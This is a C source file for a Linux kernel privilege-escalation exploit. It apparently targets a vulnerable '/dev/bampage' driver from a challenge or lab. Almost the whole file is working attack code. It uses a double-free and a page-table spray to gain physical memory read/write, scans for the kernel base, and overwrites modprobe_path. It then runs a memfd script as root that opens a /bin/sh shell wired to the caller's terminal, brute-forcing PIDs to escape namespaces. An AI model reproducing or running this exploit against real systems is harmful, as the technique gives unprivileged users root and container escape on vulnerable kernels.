#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sched.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/resource.h>
#include <time.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <err.h>
#include <sys/sendfile.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/mman.h>

#define BAM_ALLOC 0xbad1
#define BAM_EDIT 0xbad2
#define BAM_DELETE 0xbad3

#define BAM_NUM 0x10

#define KMOD_PATH_LEN 256  

#define CONFIG_STATIC_USERMODEHELPER 0 // default
#define CONFIG_STATIC_USERMODEHELPER_PATH "/sbin/usermode-helper" // default. if 1: check for this instead of modprobe_path

#define CONFIG_PHYS_MEM (0x800000000 + 0x100000000) 
#define CONFIG_PHYSICAL_ALIGN ((unsigned long long)0x200000)  // default

#define CONFIG_PTE_SPRAY_AMOUNT 0x1000
#define CONFIG_SEC_BEFORE_STORM 0

#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

// micro function (don't print "doing X..." status)
// removes error checking boilerplate
void write_file(const char *filename, const char *buf, size_t buflen, unsigned int flags)
{
    int fd;

    fd = open(filename, O_WRONLY | O_CREAT | flags, 0755);
    if (fd < 0)
    {
        perror("open$write_file");
        exit(EXIT_FAILURE);
    }

    if (write(fd, buf, buflen) != buflen)
    {
        perror("write$write_file");
        exit(EXIT_FAILURE);
    }

    close(fd);
}


int read_file(const char *filename, void *buf, size_t buflen)
{
    int fd;
    int retv;

    fd = open(filename, O_RDONLY);
    if (fd < 0)
    {
        perror("open$read_file");
        exit(EXIT_FAILURE);
    }

    retv = read(fd, buf, buflen);
    if (retv < 0)
    {
        perror("read$read_file");
        exit(EXIT_FAILURE);
    }

    close(fd);

    return retv;
}

static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;

	fd = memfd_create("", MFD_CLOEXEC);
	write(fd, "\xff\xff\xff\xff", 4);

	fexecve(fd, &argv_envp, &argv_envp);
	
	close(fd);
}

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define EXPLOIT_STAT_RUNNING 0
#define EXPLOIT_STAT_FINISHED 3


#define MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), "/proc/%u/fd/%u", (pid), (fd));

static int get_modprobe_path(char *buf, size_t buflen)
{
	int size;

	size = read_file("/proc/sys/kernel/modprobe", buf, buflen);

	if (size == buflen)
		printf("[*] ==== read max amount of modprobe_path bytes, perhaps increment KMOD_PATH_LEN? ====\n");

	// remove \x0a
	buf[size-1] = '\x00';

	return size;
}

static int strcmp_modprobe_path(char *new_str)
{
	char buf[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(buf, KMOD_PATH_LEN);
	
	return strncmp(new_str, buf, KMOD_PATH_LEN);
}


void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str, size_t modprobe_path_len)
{
	void *pmd_modprobe_addr;

	// search 0x200000 bytes (a full PTE at a time) for the modprobe_path signature
	pmd_modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
	if (pmd_modprobe_addr == NULL)
		return NULL;

	// check if this is the actual modprobe by overwriting it, and checking /proc/sys/kernel/modprobe
	strcpy(pmd_modprobe_addr, "/sanitycheck");
	if (strcmp_modprobe_path("/sanitycheck") != 0)
	{
		printf("[-] ^false positive. skipping to next one\n");
		return NULL;
	}

	return pmd_modprobe_addr;
}

static int is_kernel_base(unsigned char *addr)
{
	// thanks python
	
	// get-sig kernel_runtime_1
	if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
			memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
		return 1;

	// get-sig kernel_runtime_2
	if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
			memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
			memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
			memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
			memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
			memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
			memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
			memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
			memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
			memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
			memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
		return 1;


	return 0;
}

// presumably needs to be CPU pinned
static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	
	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;
		//printf("[*] flush tlb thread gonna sleep\n");
		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}

static void pin_cpu(int cpu_id) {
    cpu_set_t mask;

    CPU_ZERO(&mask); // clear the CPU set
    CPU_SET(cpu_id, &mask); // set the bit that represents CPU x

    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
        perror("sched_setaffinity");
        exit(1); 
    } 
}


void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

struct kcache_cmd {
    int idx;
    unsigned int sz;
    void *buf;
};

int dev_fd;

int open_dev()
{
    int fd = open("/dev/bampage", O_RDWR);
    if(fd==-1){
        err_exit("/dev/bampage");
    }
    puts("[+] Device opened");
    return fd;
}

int bampage_alloc(int index, unsigned int size, char *buf)
{
    struct kcache_cmd cmd = {
        .idx = index,
        .sz = size,
        .buf = buf,
    };

	int ret = ioctl(dev_fd, BAM_ALLOC, &cmd);
    if(ret == -1){
        perror("[bam]: allocation error");
        return EXIT_FAILURE;
    }

    puts("[bam]: bam allocated");
    return EXIT_SUCCESS;
}

int bampage_edit(int index, unsigned int size, char *buf)
{
    struct kcache_cmd cmd = {
        .idx = index,
        .sz = size,
        .buf = buf,
    };

	int ret = ioctl(dev_fd, BAM_EDIT, &cmd);
    if(ret == -1){
        perror("[bam]: allocation error");
        return EXIT_FAILURE;
    }

    puts("[bam]: bam allocated");
    return EXIT_SUCCESS;
}


int bampage_delete(int index)
{
    struct kcache_cmd cmd = {
        .idx = index,
    };

	int ret = ioctl(dev_fd, BAM_DELETE, &cmd);
	
    if(ret == -1){
        perror("[bam]: delete error");
        return EXIT_FAILURE;
    }

    puts("[bam]: bam deleted");
    return EXIT_SUCCESS;
}


static void do_unshare()
{
    int retv;

    printf("[*] creating user namespace (CLONE_NEWUSER)...\n");
    
	// do unshare seperately to make debugging easier
    retv = unshare(CLONE_NEWUSER);
	if (retv == -1) {
        perror("unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }

    printf("[*] creating network namespace (CLONE_NEWNET)...\n");

    retv = unshare(CLONE_NEWNET);
    if (retv == -1)
	{
		perror("unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);
	}
}

int exploit(int stdin_fd, int stdout_fd)
{
    unsigned long long *pte_area;
	void *_pmd_area;
	void *pmd_kernel_area;
	void *pmd_data_area;

    char modprobe_path[KMOD_PATH_LEN] = { '\x00' };

    pin_cpu(0);

    dev_fd = open_dev();

	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);

    // allocate PUD (and a PMD+PTE) for PMD
    puts("[*] allocate PUD (and a PMD+PTE) for PMD");
	mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;

    // pre-register sprayed PTEs, with 0x1000 * 2, so 2 PTEs fit inside when overlapping with PMD
	// needs to be minimal since VMA registration costs memory
    puts("[*] pre-register sprayed PTEs");
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

		if (retv == MAP_FAILED)
		{
			perror("mmap");
			exit(EXIT_FAILURE);
		}
	}

       
    // pre-allocate PMDs for sprayed PTEs
	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
	puts("[*] pre-allocate PMDs for sprayed PTEs");
    for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;

    
    // these use different PTEs but the same PMD
	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pmd_kernel_area = _pmd_area;
	pmd_data_area = _pmd_area + 0x200000;

    printf("\033[32m\033[1m[*] allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: '%s' @ \033[0m%p\n", _pmd_area, modprobe_path, modprobe_path);
    
    puts("[*] alloc  vulnerable obj...");
    bampage_alloc(1, 8, "bambamx7");

    
    // spray-allocate the PTEs from PCP allocator order-0 list
    puts("[*] spray-allocate the PTEs");
	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++){
        *(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
        
        if(i==1024){
            bampage_delete(1);
        }
    }
		
    bampage_delete(1);
    
    puts("[*] allocate overlapping PMD page (overlaps with PTE)");
    // allocate overlapping PMD page (overlaps with PTE)
	*(unsigned long long*)_pmd_area = 0xCAFEBABE;    

    // find overlapped PTE area
    puts("[*] find overlapped PTE area");
	pte_area = NULL;
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);

		// pte entry pte[0] should be the PFN+flags for &_pmd_area
		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
		if (*test_target_addr != 0x41)
		{
			printf("\033[32m\033[1m[+] confirmed double alloc PMD/PTE \033[0m\n");
			printf("\033[32m\033[1m    - PTE area index: %lld \033[0m\n", i);
			printf("\033[32m\033[1m    - PTE area (write target address/page): 0x%016llx (new)\033[0m\n", *test_target_addr);
			pte_area = test_target_addr;
		}
	}

	if (pte_area == NULL)
	{
		printf("[X] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n", *(unsigned long long*)_pmd_area);

		return EXIT_FAILURE;
	}

    *pte_area = 0x0 | 0x8000000000000867;

    flush_tlb(_pmd_area, 0x400000);

    printf("\033[32m\033[1m    - PMD area (read target value/page): 0x%016llx (new)\033[0m\n", *(unsigned long long*)_pmd_area);

    // run this script instead of /sbin/modprobe
	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
	int status_fd = memfd_create("", 0);

    // range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		unsigned long long kernel_iteration_base;

		kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);

		printf("\r[*] setting kernel physical address range to 0x%016llx - 0x%016llx", kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
		printf("\n");
		for (unsigned short j=0; j < 512; j++)
			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;

		flush_tlb(_pmd_area, 0x400000);

		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j < 512; j++) 
		{
			unsigned long long phys_kernel_base;
		
			// check for x64-gcc/clang signatures of kernel code segment at rest and at runtime
			// - this "kernel base" is actually the assembly bytecode of start_64() and variants
			// - it's different per architecture and per compiler (clang produces different signature than gcc)
			// - this can be derived from the vmlinux file by checking the second segment, which starts likely at binary offset 0x200000
			//   - i.e: xxd ./vmlinux | grep '00200000:'
			
			phys_kernel_base = kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j;

			printf("\r\033[34m\033[1m[*] phys kernel addr: 0x%016llx, val: 0x%016llx \033[0m", phys_kernel_base, *(unsigned long long*)(pmd_kernel_area + j * 0x1000));
			
			if (is_kernel_base(pmd_kernel_area + j * 0x1000) == 0)
				continue;

			printf("\n\033[32m\033[1m[+] found possible physical kernel base: 0x%016llx\033[0m\n", phys_kernel_base);
			
			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i < 40; i++) 
			{
				void *pmd_modprobe_addr;
				unsigned long long phys_modprobe_addr;
				unsigned long long modprobe_iteration_base;

				modprobe_iteration_base = phys_kernel_base + i * 0x200000;

				printf("\r[*] setting physical address range to 0x%016llx - 0x%016llx", modprobe_iteration_base, modprobe_iteration_base + 0x200000);

				// set the pages for the other threads PUD data range to kernel memory
				for (unsigned short j=0; j < 512; j++)
					pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000867;

				flush_tlb(_pmd_area, 0x400000);
				
#if CONFIG_STATIC_USERMODEHELPER
				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
#else
				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000, modprobe_path, KMOD_PATH_LEN);
#endif
				if (pmd_modprobe_addr == NULL)
					continue;

#if CONFIG_LEET
				breached_the_mainframe();
#endif

				phys_modprobe_addr = modprobe_iteration_base + (pmd_modprobe_addr - pmd_data_area);
				printf("\n\033[32m\033[1m[+] verified modprobe_path/usermodehelper_path: 0x%016llx ('%s')...\033[0m\n", phys_modprobe_addr, (char*)pmd_modprobe_addr);

				printf("[*] modprobe_script_fd: %d, status_fd: %d\n", modprobe_script_fd, status_fd);
				
				printf("[*] overwriting path with PIDs in range 0->4194304...\n");
				for (pid_t pid_guess=0; pid_guess < 4194304; pid_guess++)
				{
					int status_cnt;
					char buf;

					// overwrite the `modprobe_path` kernel variable to "/proc/<pid>/fd/<script_fd>"
					// - use /proc/<pid>/* since container path may differ, may not be accessible, et cetera
					// - it must be root namespace PIDs, and can't get the root ns pid from within other namespace
					MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);

					if (pid_guess % 50 == 0)
					{
						printf("\033[32m\033[1m[+] overwriting modprobe_path with different PIDs (%u-%u)...\033[0m\n", pid_guess, pid_guess + 50);
						printf("    - i.e. '%s' @ %p...\n", (char*)pmd_modprobe_addr, pmd_modprobe_addr);
						printf("    - matching modprobe_path scan var: '%s' @ %p)...\n", modprobe_path, modprobe_path);
					}
						
					lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
					dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid_guess, status_fd, pid_guess, stdin_fd, pid_guess, stdout_fd);

					// run custom modprobe file as root, by triggering it by executing file with unknown binfmt
					// if the PID is incorrect, nothing will happen
					modprobe_trigger_memfd();

					// indicates correct PID (and root shell). stops further bruteforcing
					status_cnt = read(status_fd, &buf, 1);
					if (status_cnt == 0)
						continue;

					printf("\033[32m\033[1m[+] successfully breached the mainframe as real-PID %u\033[0m\n", pid_guess);

				}

				printf("[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n");

			}
			
			printf("[-] failed to find correct modprobe_path: trying to find new kernel base...\n");
		}
	}

	printf("[!] failed to find kernel code segment... CONFIG_STATIC_USERMODEHELPER disabled?\n");
	
    return 0;    

}

void signal_handler_sleep(int sig)
{
	printf("[*] handling ctrl-c by sleeping background thread\n");
	printf("!! >> if you did this while in the root shell, the terminal will be messed up << !!\n");
	sleep(9999);
}

int main()
{
    int *status;
    status = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    *status = EXPLOIT_STAT_RUNNING;

    if(fork()==0){
        int stdin_fd;
        int stdout_fd;
        signal(SIGINT, signal_handler_sleep);
        stdin_fd = dup(STDIN_FILENO);
        stdout_fd = dup(STDOUT_FILENO);
        
        exploit(stdin_fd, stdout_fd);
        *status = EXPLOIT_STAT_FINISHED;
        sleep(9999);
    }
    
    SPINLOCK(*status == EXPLOIT_STAT_RUNNING);

    return 0;
   
}